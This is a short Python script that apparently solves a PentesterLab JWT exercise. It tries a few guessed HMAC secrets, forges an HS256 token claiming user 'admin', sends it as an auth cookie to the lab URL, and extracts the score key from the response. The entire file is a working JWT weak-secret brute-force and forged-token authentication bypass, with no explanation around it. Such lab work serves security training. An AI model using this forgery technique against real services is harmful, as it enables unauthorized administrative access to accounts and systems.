#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
#header = '{"typ":"JWT","alg":"HS256"}'
#payload = '{"user":null}'

import jwt
import requests
import re

url = 'http://ptl-22a98329-141fe22c.libcurl.so/'
cookies = {'_portal_ptl_io_session':'ejRtYnF2UkNuK3hDU0hnQm1mc1RqK090bVRsRjk4NkRlNTYyTGl6NSsrWGhRTUxoclVRcHJsNHd6Q3hpNlZpaXZSU3ZFUFgyYWJKQTZYUmgxdDF0RTI2SzFMYnRTaWgwOU1DT25yKzQzemNCbkErR2t1VFVteEVIOEhNSElvRjdIM1UrY1VkVGozY0ZoeklSOS9QdjFObTV3djZEYWtOZCtCTm5tOWpWUitWY2tQNnFCYjF6Wm83ZTlIOE5hc28xdjhKOTl3bGMyaDdwbFMxUDBaa3JXdUFRanNJbDFoLzRENEJWTDBrSDlCeDdYREg2WnZQWUcyMFhoQ3dQZzJ1WFdJZHUxUWozdjQ5d2YweTRlRHNIbDlpTVBqME9hMDUxMjFLWXplQm1EOW1qL1lEeUZVL3AwN2JMQ2haSllGR0o5OVZPT0JucmJZT0NIY1lMYXZEZmhNdmkrZFhRL3dCNW1JZEF5QW4wMjdLTWNiaEgyOUFYVUxiU1F2eXBMM3I0ME8wZHloU1NHLzVzQnJ2VjhoeFljRzk4WEpSUDNVeVpOeDRna2p4elg5Zz0tLXllOHF1SGcrWE0zSlBDK25iOHV0WWc9PQ==--c785892e40e33e2cf1da0f985024457563987318'}

for word in ['hacker', 'jwt', 'insecurity', 'pentesterlab', 'hacking']:
    encoded_jwt = jwt.encode({'user':'admin'}, word, algorithm='HS256')
    cookies['auth'] = encoded_jwt.decode()
    response = requests.get(url, cookies=cookies)
    if 'You are not logged in as' not in response.text:
        flag = re.findall('<b> The key to score is (.*) </b>', response.text)
        print(word, flag)


